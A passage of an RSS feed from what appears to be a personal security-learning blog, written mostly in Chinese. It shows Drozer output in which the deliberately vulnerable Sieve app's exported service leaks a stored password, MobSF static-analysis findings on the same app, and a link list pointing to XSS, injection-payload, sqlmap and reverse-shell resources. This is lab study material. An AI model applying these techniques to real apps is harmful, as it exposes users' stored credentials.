&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> what: &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg1: &lt;span style="color:#ae81ff">41&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg2: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Extras
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.PASSWORD &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span> : 123456acitseccom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve by MobSF</title><link>https://bernie6401.github.io/tools/others/android-related/mobsf/test-sieve-by-mobsf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/mobsf/test-sieve-by-mobsf/</guid><description>&lt;h1 id="test-sieve-by-mobsf">
 Test Sieve by MobSF
 &lt;a class="anchor" href="#test-sieve-by-mobsf">#&lt;/a>
&lt;/h1>
&lt;p>這個工具真的很完整，而且蠻萬用的，光是靜態分析就很詳細&lt;/p>
&lt;h2 id="static-analysis">
 Static Analysis
 &lt;a class="anchor" href="#static-analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Overview
一開始就告訴測試者有多少的東西被export，和Drozer分析的一樣
&lt;img src="https://hackmd.io/_uploads/H1oU-p3E0.png" alt="圖片" />&lt;/li>
&lt;li>Application Permission
MobSF還可以分析實際寫的code並且查看哪邊有Permission相關的威脅，在Code Analysis的地方有重複的提到External Read/Write的漏洞
&lt;img src="https://hackmd.io/_uploads/SJW6fTnV0.png" alt="圖片" />&lt;/li>
&lt;li>Manifest Analysis
這一段就很像Drozer做attack surface後的結果，也就是activity/service/broadcast receiver/content providers exported + is debuggable
&lt;ul>
&lt;li>Activity Exported
&lt;img src="https://hackmd.io/_uploads/HJZw4ahVC.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/HJhO4p2EA.png" alt="圖片" />&lt;/li>
&lt;li>Service Exported
&lt;img src="https://hackmd.io/_uploads/r1msNa3VR.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/rJXTNpnER.png" alt="圖片" />&lt;/li>
&lt;li>Content Providers Exported
&lt;img src="https://hackmd.io/_uploads/BkrR4a3NC.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/B1GJHa24C.png" alt="圖片" />
在Code Analysis的地方有重複的提到這個漏洞&lt;/li>
&lt;li>Debuggable
&lt;img src="https://hackmd.io/_uploads/SyObSpn4A.png" alt="圖片" />
在Code Analysis的地方有重複的提到這個漏洞&lt;/li>
&lt;li>其他
&lt;ul>
&lt;li>版本過低
&lt;img src="https://hackmd.io/_uploads/SyVkL63VC.png" alt="圖片" />&lt;/li>
&lt;li>Backupable
&lt;img src="https://hackmd.io/_uploads/B1LSvpn4A.png" alt="圖片" />&lt;/li>
&lt;li>和最近的CVE PoC分析
這個功能蠻好的，例如下圖，這三個漏洞都是去分析&lt;code>FileSelectActivity&lt;/code>/&lt;code>MainLoginActivity&lt;/code>/&lt;code>PWList&lt;/code>得出可能會有StrandHogg 2.0 或StrandHogg的問題，關於StrandHogg 2.0 的說明可以看&lt;a href="https://www.twcert.org.tw/tw/cp-104-3636-6072b-1.html">twcert的文章&lt;/a>，簡單來說這個惡意軟體的效果是常駐在各個正常執行的軟體背後，並且竊取一些機敏資料
&lt;img src="https://hackmd.io/_uploads/HJf0IpnN0.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/S16AL634R.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/H12kva34C.png" alt="圖片" />
&lt;blockquote>
&lt;p>StrandHogg 2.0 的運作原理，和去年發現的 StrandHogg 相當類似，都可在感染後將自己隱藏在正常的軟體身後；當用戶開啟正常軟體時，真正執行的並不是這個正常版的軟體，而是植入了惡意軟體程式碼的「分身」。
新版 StrandHogg 2.0 除了上述的類似功能外，還能讓惡意軟體偽裝成任意的 Android App；先前的版本只能偽裝成 TaskAffinity 這支 App，甚至能在用戶點按開啟任何 App 時立刻偽裝成該 App。&lt;/p></description></item><item><title>Useful Link</title><link>https://bernie6401.github.io/tools/others/useful-link/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/useful-link/</guid><description>&lt;h1 id="useful-link">
 Useful Link
 &lt;a class="anchor" href="#useful-link">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="knowledge">
 Knowledge
 &lt;a class="anchor" href="#knowledge">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Knowledge&lt;/th>
 &lt;th style="text-align: left">Comment&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="http://violin-tao.blogspot.com/2016/04/crlflf-bug.html">CRLF VS LF&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.analyticsvidhya.com/blog/2021/07/explore-the-magic-methods-in-python/">magic method&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-2/">HttpOnly&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10193762">Encrypt VS Hash&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10240486">LFI VS RFI&lt;/a>&lt;/td>
 &lt;td style="text-align: left">LFI(Local File Inclusion)&lt;/br>產生的原因是程式設計師未對用戶參數未進行輸入檢查，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏&lt;/br>&lt;/br>RFI(Remote File Include)&lt;/br>基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數allow_url_include 訂為ON&amp;quot;&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://experience.dropbox.com/zh-tw/resources/what-is-ftp">FTP&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://experience.dropbox.com/zh-tw/resources/what-is-ftp">WebDAV&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://johnpam11.pixnet.net/blog/post/120987008-%E4%BB%80%E9%BA%BC%E6%98%AFbt%E7%A8%AE%E5%AD%90%EF%BC%9F">BitTorrent&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://moptt.tw/p/Storage_Zone.M.1618079877.A.829">TrueNAS Setup&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="http://thecodingtime.blogspot.com/2014/02/apimethodlibrary.html">API VS Method VS Library&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.letswrite.tw/websocket/">WebSocket&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.jyt0532.com/2020/02/14/jvm-introduction/">JVM&lt;/a>&lt;/td>
 &lt;td style="text-align: left">Briefly Introduction&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://pjchender.dev/computer-science/cs-process-thread/">Thread VS Process&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://blog.trendmicro.com.tw/?p=123">APT&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://gist.github.com/LeeKLTW/e5004f2d7046d43676d0891af8a13ef7">Arrow VS Dot VS Colon in C++&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://kknews.cc/zh-tw/code/ogmnm55.html">payload VS formData&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://raidnas.tw/hsinchu-nas-raid-explain-rescue/">RAID 0, 1, 0+1, 1+0, 5, 6&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.wongwonggoods.com/all-posts/python/python_parellel/python-multiprocessing-pool">How to use multiprocess in python &amp;amp; map VS pool VS apply_async&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://myapollo.com.tw/blog/begin-to-asyncio/">Python asyncio 從不會到上路&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10264453">JDK、JRE 和 JVM&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="tool-page">
 Tool-Page
 &lt;a class="anchor" href="#tool-page">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Tool&lt;/th>
 &lt;th style="text-align: left">Comment&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection:&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10249487">SQLMAP1&lt;/a>&lt;/br>&lt;a href="https://ithelp.ithome.com.tw/articles/10202811">SQLMAP2&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.virustotal.com/gui/">ViruTotal&lt;/a>&lt;/td>
 &lt;td style="text-align: left">幫忙分析檔案是否有病毒的網站&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://obfuscator.io/">JS 混淆器&lt;/a>&lt;/td>
 &lt;td style="text-align: left">把JS的程式變成可讀性很差的東西&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>&lt;/td>
 &lt;td style="text-align: left">可以反混淆或解密JS的檔案&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.yougetsignal.com/">Everything About Net Scanning&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.howtohaven.com/system/how-to-hash-file-on-windows.shtml#void">How to fetch SHA1 or MD5 in Win.&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.netadmin.com.tw/netadmin/zh-tw/technology/EDC6D4560B184F0D9E7A750862D3C9E4">How to split windows in WSL?&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://yingclin.github.io/2018/docker-basic.html">Docker基本命令&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="vocabulary">
 Vocabulary
 &lt;a class="anchor" href="#vocabulary">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Vocabulary&lt;/th>
 &lt;th>Def.&lt;/th>
 &lt;th>Comment&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>Parse&lt;/td>
 &lt;td>解析&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>query&lt;/td>
 &lt;td>詢問、請求&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>dump&lt;/td>
 &lt;td>Also called a crash dump or memory dump, a dump is raw data from a computer&amp;rsquo;s memory. It is written to the file system if software crashes&amp;quot; (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it.&lt;/td>
 &lt;td>&lt;a href="https://www.computerhope.com/jargon/d/dump.htm">Refer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>intruder&lt;/td>
 &lt;td>入侵者&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>vulnerability&lt;/td>
 &lt;td>漏洞、脆弱&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>exploit&lt;/td>
 &lt;td>An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network.&lt;/td>
 &lt;td>&lt;a href="https://www.trendmicro.com/vinfo/us/security/definition/exploit">Refer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>wrapper&lt;/td>
 &lt;td>偽協議&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Cipher&lt;/td>
 &lt;td>密碼&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>nerf&lt;/td>
 &lt;td>cause to be weak or ineffective削弱、減弱&lt;/td>
 &lt;td>&lt;a href="https://english.cool/op-nerf-buff/">Refer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Miscellaneous&lt;/td>
 &lt;td>混雜的、各種各樣的&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>PoC&lt;/td>
 &lt;td>Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>PWN&lt;/td>
 &lt;td>1.具漏洞的服務&lt;/br>2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權&lt;/td>
 &lt;td>&lt;a href="https://csc.nccst.nat.gov.tw/shield.aspx/">Refer1&lt;/a>&lt;/br>&lt;a href="https://ithelp.ithome.com.tw/articles/10295763">Refer2&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>DHCP&lt;/td>
 &lt;td>主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ycc.idv.tw/confusion-matrix.html">秒懂Confusion Matrix&lt;/a>&lt;/td>
 &lt;td>&lt;img src="https://ycc.idv.tw/media/mechine_learning_measure/mechine_learning_measure.002.jpeg" alt="" />&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="ithelp">
 IThelp
 &lt;a class="anchor" href="#ithelp">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Information-Security&lt;/th>
 &lt;th>Web-Security&lt;/th>
 &lt;th>Python&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10282551">惡意程式(malware)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10202811">Day 4 很像走迷宮的sqlmap&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10235251">[Series - 8] Python時間轉換介紹&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10240752">不安全的連線？HTTPS與SSL憑證&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10249489">[Day20]-新手的Web系列SQLmap&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10185182">[第06天] 資料結構（3）Data Frame&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10248442">Day 018.聽起來好像很厲害的-密碼學&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">Day 12 - PHP 偽協議 (一) &lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10231535">dlib安裝心得 &amp;ndash; Windows 環境&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10278494">Day21-針對Metasploitable 3進行滲透測試(2)-Shell &amp;amp; Reverse Shell基礎知識&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10244403">[Day13]-SSTI(Server-side template injection)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10261688">【Day 9】Python打包程式&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10193762">[2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10272749">[Day11]SSTI(Server Side Template Injection)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10280076">[Day28] 儲存訓練好的模型&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10193241">[2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10240486">[Day7]-PHP(LFI/RFI)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10258195">[Python]關鍵字yield和return究竟有什麼不同?&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10249953">Day 21.加密演算法要注意的那些毛(一)-加密模式&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10208651">[Day23]forensics的開始&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227380">『Day 27』拜託別Pwn我啦！-常見的工具（下）&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Deep-Learning&lt;/th>
 &lt;th>Big-Data&lt;/th>
 &lt;th>Linux&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10209058">[演算法]K-means分群(K-means Clustering)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10200912">[改善資料品質]Part-1 EDA &lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10127590">從沒圖進化到有圖有字的工具：cowsay&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10187314">[第24天] 機器學習（4）分群演算法&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10207473">Day18-shell是什麼？&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227098">[AI#10]人臉辨識&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10257294">C語言工具使用，GDB個人學習筆記&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10229049">淺談機器學習的效能衡量指標(2)&amp;ndash;ROC/AUC曲線&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10273094">[Day15]機器學習常勝軍-XGBoost &lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227654">[Day20]Lasso和Ridge正規化回歸&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Web-Develop&lt;/th>
 &lt;th>JS&lt;/th>
 &lt;th>Webpage-Automation&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10224417">17. [FE] 為什麼現在的前端都在用「框架」？&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10202260">你不可不知的 JavaScript 二三事#Day3：資料型態的夢魘——動態型別加弱型別(2)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10229959">鼠年全馬鐵人挑戰 WEEK 06：Selenium 自動化測試工具 &lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10274829">D29-如何打包Apps Script的程式碼？（二）包成HTML網頁與或API&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10221214">10. [JS] 一般函式與箭頭函式的差異？ &lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10230717">鼠年全馬鐵人挑戰 WEEK 09：Selenium WebDriver (下)&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10202689">Day03-深入理解網頁架構：DOM&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10281036">【Day 27】-再爬一次Dcard?(實戰向 Dcard API 發出請求)&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10114805">PHP物件導向的第四課：繼承&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10196817">[Day23]Beautiful Soup網頁解析！&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10114707">PHP物件導向的第二課：重談「方法」，物件「屬性」及「成員」&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10247175">[Day 17] Instagram - 模擬登入&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10114633">PHP物件導向的第一課：class&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10224935">Day 20 Authentication基礎概念介紹：session、cookie and token&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10207241">Day 17 - 會員登入系統&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10197921">XAMPP安裝與操作初步&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10237545">What is metadata?&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Reverse-Engineering&lt;/th>
 &lt;th>Others&lt;/th>
 &lt;th>PWN&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10187490">[Day10]格式透視-解析PE文件格式（前篇）&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10237039">第二天：要了解DLL你要先講啊&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227326">『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） &lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10188209">[Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10238425">第四天：Dll聽話 讓我看看&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227380">『Day 27』拜託別Pwn我啦！-常見的工具（下）&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10223580">Day16-分散式系統溝通的方法-RPC&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10226977">Day25: [Misc] 我從來沒想過我會害怕寫 code&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10283174">C語言雜談01&amp;mdash;如何理解條件編譯&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10217608">C#編譯到執行與Java的相似之處&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="conference--journal-for-information-security">
